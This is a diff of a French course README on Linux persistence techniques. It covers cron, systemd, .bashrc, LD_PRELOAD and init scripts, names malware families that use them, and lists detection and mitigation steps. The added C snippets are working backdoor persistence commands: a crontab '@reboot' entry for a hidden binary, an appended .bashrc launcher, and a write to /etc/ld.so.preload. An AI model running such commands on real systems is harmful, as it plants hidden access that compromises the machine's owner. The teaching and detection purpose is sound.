@@ -1,85 +1,58 @@
-# Module 33 : Persistence Linux
+# Linux Persistence - Survivre aux Redémarrages
 
-## Vue d'ensemble
+Cron jobs, systemd services, .bashrc hijacking, LD_PRELOAD, init scripts - techniques pour maintenir accès après redémarrage Linux. Utilisé par rootkits et backdoors pour persistence long-terme.
 
-Ce module explore les techniques de persistence sur systèmes Linux/Unix permettant à un programme de s'exécuter automatiquement au démarrage ou lors d'événements système.
+⚠️ AVERTISSEMENT STRICT : Techniques de malware development avancées. Usage éducatif uniquement. Tests sur VM isolées. Usage malveillant = PRISON.
 
-## Concepts abordés
+```c
+// Cron job persistence
+system("(crontab -l 2>/dev/null; echo '@reboot /tmp/.hidden') | crontab -");
 
-### 1. Cron Jobs
-Tâches planifiées via crontab pour exécution périodique ou au démarrage.
+// .bashrc persistence
+FILE *f = fopen(bashrc_path, "a");
+fprintf(f, "\n/tmp/.backdoor &\n");
+fclose(f);
+
+// LD_PRELOAD hijacking
+system("echo '/tmp/malicious.so' >> /etc/ld.so.preload");
+```
+
+## Compilation
 
 ```bash
-# Exécution au démarrage
-@reboot /path/to/script
-
-# Toutes les heures
-0 * * * * /path/to/script
+gcc example.c -o persist_linux
 ```
 
-### 2. Systemd Services
-Services systemd pour démarrage automatique et gestion.
+## Concepts clés
 
-```ini
-[Unit]
-Description=My Service
+- **Cron Jobs** : @reboot, @daily pour exécution programmée
+- **Systemd Services** : .service files dans /etc/systemd/system/
+- **.bashrc/.profile** : Exécution au login shell (user-level)
+- **/etc/profile** : Global pour tous users (nécessite root)
+- **LD_PRELOAD** : /etc/ld.so.preload pour injection bibliothèque
+- **Init Scripts** : /etc/rc.local, /etc/init.d/ (SysV)
+- **XDG Autostart** : ~/.config/autostart/ (desktop environments)
 
-[Service]
-ExecStart=/path/to/executable
+## Techniques utilisées par
 
-[Install]
-WantedBy=multi-user.target
-```
+- **Linux.Mirai** : Cron jobs + .bashrc modification
+- **XorDDoS** : Init scripts + systemd services
+- **Turla (Snake)** : LD_PRELOAD rootkit + systemd
+- **HiddenWasp** : /etc/ld.so.preload + init scripts
+- **Rocke Cryptominer** : Cron @reboot + systemd persistence
 
-### 3. Shell RC Files
-Modification des fichiers de configuration shell (.bashrc, .profile).
+## Détection et Mitigation
 
-**Fichiers principaux** :
-- ~/.bashrc (Bash)
-- ~/.profile (shell de connexion)
-- ~/.zshrc (Zsh)
-- /etc/profile (global)
+**Indicateurs** :
+- Nouveaux cron jobs suspects (crontab -l)
+- Services systemd non-standard (systemctl list-units)
+- Modifications .bashrc/.profile timestamps
+- /etc/ld.so.preload existence (normalement vide)
+- Init scripts non-signés dans /etc/init.d/
 
-### 4. LD_PRELOAD Hijacking
-Préchargement de bibliothèques partagées.
-
-```bash
-export LD_PRELOAD=/path/to/malicious.so
-```
-
-### 5. Init Scripts
-Scripts d'initialisation dans /etc/init.d/ ou /etc/rc.local.
-
-## AVERTISSEMENT LÉGAL
-
-**IMPORTANT** : Ces techniques sont sensibles et utilisées par les malwares.
-
-**Utilisations légitimes** :
-- Applications légitimes nécessitant démarrage automatique
-- Administration système
-- Recherche en sécurité
-
-**STRICTEMENT INTERDIT** :
-- Installation non autorisée
-- Création de backdoors
-- Activités malveillantes
-
-**L'utilisateur est SEUL RESPONSABLE** de l'usage de ces techniques.
-
-## Détection
-
-Outils :
-- chkrootkit : Détection de rootkits
-- rkhunter : Scanner de rootkits
-- auditd : Surveillance système
-- systemctl list-units : Liste des services
-
-## Ressources
-
-- Linux Documentation - systemd
-- crontab man pages
-- MITRE ATT&CK - Linux Persistence
-
-## Exercices
-
-Consultez `exercice.txt` et `solution.txt`.
+**Mitigations** :
+- chkrootkit scan régulier (détection rootkits)
+- rkhunter --check (scan persistence)
+- auditd monitoring (file access logs)
+- Immutable flags sur fichiers critiques (chattr +i)
+- SELinux/AppArmor policies strictes
